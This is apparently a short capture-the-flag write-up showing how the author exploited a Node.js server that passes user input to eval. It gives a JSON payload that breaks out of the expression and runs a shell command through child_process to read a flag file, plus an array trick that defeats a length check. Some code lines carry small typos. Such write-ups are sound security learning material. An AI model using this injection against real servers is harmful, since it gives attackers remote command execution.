This node server had an eval function taking width and height as input

eval('(' + width + '**2 + ' + height + '**2) ** (1/2);' )

the web interface would allow only numbers so we have to use requests module in python3

i used a post request containing json as {
    "width":"1);throw require(child_process).execSync('cat /flag.txt')//",
    "height":1
}

the above width would evaluate to eval((1);throw rerequire(child_process).execSync('cat /flag.txt')//)rest is commented out
but there was a length check width <10 so instead of passing it as a string i passed as an array

"width":["1)....."]

that way length of array is number of elements =======> which is 1
so the code will execute and return a flag

however note here that string + [string] = string ==========> otherwise it wouldnt have worked

(the location of the flag i assumed)
